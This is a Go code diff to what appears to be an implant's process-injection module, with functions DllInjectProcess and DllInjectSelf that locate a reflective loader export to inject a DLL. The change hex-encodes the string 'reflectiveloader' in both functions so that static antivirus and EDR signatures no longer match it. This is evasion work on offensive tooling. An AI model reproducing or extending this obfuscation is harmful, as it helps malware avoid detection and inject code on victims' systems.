@@ -4,6 +4,7 @@ package packet
 
 import (
 	"bytes"
+	"encoding/hex"
 	"errors"
 	"fmt"
 	"github.com/Binject/debug/pe"
@@ -165,9 +166,10 @@ func DllInjectProcess(params []byte, b []byte) ([]byte, error) {
 		return nil, err
 	}
 
+	r, _ := hex.DecodeString("7265666c6563746976656c6f61646572")
 	var RDIOffset uintptr
 	for _, exp := range ex {
-		if strings.Contains(strings.ToLower(exp.Name), "reflectiveloader") {
+		if strings.Contains(strings.ToLower(exp.Name), string(r)) {
 			RDIOffset = uintptr(rvaToOffset(p, exp.VirtualAddress))
 		}
 	}
@@ -272,9 +274,10 @@ func DllInjectSelf(params []byte, b []byte) ([]byte, error) {
 		return nil, err
 	}
 
+	r, _ := hex.DecodeString("7265666c6563746976656c6f61646572")
 	var RDIOffset uintptr
 	for _, exp := range ex {
-		if strings.Contains(strings.ToLower(exp.Name), "reflectiveloader") {
+		if strings.Contains(strings.ToLower(exp.Name), string(r)) {
 			RDIOffset = uintptr(rvaToOffset(p, exp.VirtualAddress))
 		}
 	}
